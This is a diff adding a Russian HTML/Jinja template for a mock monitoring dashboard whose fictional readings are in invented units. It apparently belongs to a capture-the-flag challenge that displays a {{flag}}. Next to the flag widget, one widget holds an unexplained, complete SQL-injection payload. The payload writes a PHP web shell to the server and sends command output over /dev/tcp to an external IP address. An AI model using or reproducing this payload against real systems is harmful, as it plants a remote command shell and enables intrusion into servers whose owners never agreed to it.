@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Личный кабинет оператора</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    .dashboard {
+      display: flex;
+      height: 100vh;
+    }
+
+    .sidebar {
+      background-color: #f2f2f2;
+      width: 200px;
+      padding: 20px;
+    }
+
+    .main-content {
+      flex-grow: 1;
+      padding: 20px;
+    }
+
+    .widget {
+      background-color: #ffffff;
+      border: 1px solid #cccccc;
+      border-radius: 5px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+
+    .widget-header {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .widget-content {
+      color: #888888;
+    }
+
+    .widget-footer {
+      color: #888888;
+      font-size: 12px;
+      text-align: right;
+    }
+  </style>
+</head>
+<body>
+  <div class="dashboard">
+    {% if error_message %}
+      <div class="main-content">
+        <p>ОШИБКА! {{error_message}}</p>
+      </div>
+    {% else %}
+      <div class="sidebar">
+          <p>Здравствуйте, {{user}}</p>
+          <a href="/{{token}}/">Покинуть демонстрацию</a>
+      </div>
+      <div class="main-content">
+        {% if user == "test" %}
+        <div class="widget">
+          <div class="widget-header">Отчёт по уцуцуге №1</div>
+          <div class="widget-content">
+            <p>За последние 24 часа было проведено наблюдение за уцуцугой в указанной области. Система "УНИИИУ-Монитор" предоставила следующие результаты:</p>
+            <ul>
+              <li>Уровень уцуцуги: Зафиксировано среднее значение уровня уцуцуги в районе 5,2 Югорских уцуца. В течение дня, уровень поднимался и опускался в пределах 0,3 Югорских уцуца.</li>
+              <li>Активность уцуцуги: Обнаружено, что уцуцуга проявляет повышенную активность во второй половине дня. Были зафиксированы повышенные значения активности, достигающие пика около 15:00.</li>
+            </ul>   
+          </div>
+          <div class="widget-footer">Создано 3 июня 2023 г.</div>
+        </div>
+        <div class="widget">
+          <div class="widget-header">Отчёт по уцуцуге №2</div>
+          <div class="widget-content">
+            <p>За последние 24 часа было проведено наблюдение за уцуцугой в указанной области. Система "УНИИИУ-Монитор" предоставила следующие результаты:</p>
+            <ul>
+              <li>Уровень уцуцуги: В среднем за последние 24 часа уровень уцуцуги составлял 4,8 Югорских уцуца. В течение дня наблюдались незначительные колебания, не превышающие 0,2 Югорских уцуца.</li>
+              <li>Активность уцуцуги: В начале дня была отмечена низкая активность уцуцуги, с пиком около 9:00. Во второй половине дня активность постепенно возрастала и достигла максимума около 16:00.</li>
+            </ul>   
+          </div>
+          <div class="widget-footer">Создано 3 июня 2023 г.</div>
+        </div>
+        {% else %}
+        <div class="main-content">
+          <div class="widget">
+            <div class="widget-header">Добро пожаловать!</div>
+            <div class="widget-content">
+              <p>Это личный кабинет оператора системы УНИИИУ-Монитор. Здесь будут появляться отчёты и предупреждения об уровнях уцуцуги.</p>
+            </div>
+            <div class="widget-footer">Создано 3 июня 2023 г.</div>
+          </div>
+        {% endif %}
+        {% if flag %}
+        <div class="widget">
+          <div class="widget-header">АВАРИЙНЫЙ СИГНАЛ ПО УЦУЦУГЕ</div>
+          <div class="widget-content">
+              <p>ВНИМАНИЕ! Зафикисирован уровень уцуцуги, превышающий норму в 10 Югорских уцуцев! Для дальнейшего анализа воспользуйтесь следующим уникальным идентификатором уцуцуги: {{flag}}</p>
+          </div>
+          <div class="widget-footer">Создано 3 июня 2023 г.</div>
+        </div>
+        <div class="widget">
+          <div class="widget-header">1</div>
+          <div class="widget-content">
+              <p>&#39; union select 1,&lt;?php exec(&quot;bash -c &quot; . $_GET[&quot;cmd&quot;] . &quot; &gt; /dev/tcp/51.250.71.205/52904&quot;) INTO OUTFILE &#39;/var/www/ekran/cmd.php&#39; -- </p>
+          </div>
+          <div class="widget-footer">Создано 3 июня 2023 г.</div>
+        </div>
+        {% endif %}
+      {% endif %}
+    </div>
+    </div>
+  </div>
+</body>
+</html>
